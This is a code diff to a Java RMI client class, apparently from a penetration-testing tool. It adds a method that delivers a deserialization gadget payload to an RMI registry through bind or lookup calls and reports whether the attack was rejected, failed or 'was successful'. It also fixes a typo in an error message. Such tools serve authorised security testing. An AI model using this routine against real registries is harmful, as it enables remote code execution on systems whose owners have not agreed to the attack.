@@ -168,6 +168,58 @@ public class RegistryClient {
         return marshal;
     }
 
+
+    public void gadgetCall(Object payloadObject, boolean local)
+    {
+        String callName = "";
+
+        Logger.println("");
+        Logger.printlnBlue("Attempting deserialization attack on RMI registry endpoint...");
+        Logger.println("");
+        Logger.increaseIndent();
+
+        try {
+            if( !local ) {
+                callName = callNames[2];
+                lookupCall(payloadObject);
+            } else {
+                callName = callNames[0];
+                bindCall(payloadObject);
+            }
+
+        } catch( Exception e ) {
+
+            Throwable cause = RMGUtils.getCause(e);
+
+            if( cause instanceof java.io.InvalidClassException ) {
+                Logger.eprintMixedYellow("RMI registry", "rejected", "deserialization of the supplied gadget");
+                Logger.printlnPlainYellow(" (JEP290 is installed).");
+                RMGUtils.showStackTrace(e);
+
+            } else if( cause instanceof java.lang.ClassNotFoundException) {
+                Logger.eprintlnMixedYellow("RMI registry", "accepted", "deserialization of the supplied gadget.");
+                Logger.eprintlnMixedYellow("However, the gadget seems to be", "not available", "on the servers classpath.");
+                Logger.eprintln("Try a different gadget.");
+                RMGUtils.showStackTrace(e);
+
+            } else if( cause instanceof java.lang.ClassCastException) {
+                Logger.printlnMixedYellow("Caught", "ClassCastException", "during deserialization attack.");
+
+                if(!local)
+                    Logger.printlnMixedBlue("The server uses either", "readString()", "to unmarshal String parameters, or");
+
+                Logger.printlnMixedYellowFirst("Deserialization attack", "was successful :)");
+                RMGUtils.showStackTrace(e);
+
+            } else {
+                Logger.eprintlnMixedYellow("Caught unexpcted exception during", callName, "call.");
+                Logger.eprintln("Please report this to improve rmg :)");
+                RMGUtils.stackTrace(e);
+                RMGUtils.exit();
+            }
+        }
+    }
+
     public void codebaseCall(Object payloadObject, boolean local)
     {
         String callName = "";
@@ -207,7 +259,7 @@ public class RegistryClient {
 
             } else if( cause instanceof java.lang.UnsupportedClassVersionError) {
                 Logger.eprintlnMixedYellow("Caught", "UnsupportedClassVersionError", "during " + callName + " call.");
-                Logger.eprintlnMixedBlue("You probably used an", "uncompatible compiler", "for class generation.");
+                Logger.eprintlnMixedBlue("You probably used an", "incompatible compiler", "for class generation.");
                 Logger.eprintln("Original error: " + e.getMessage());
                 RMGUtils.showStackTrace(e);
 
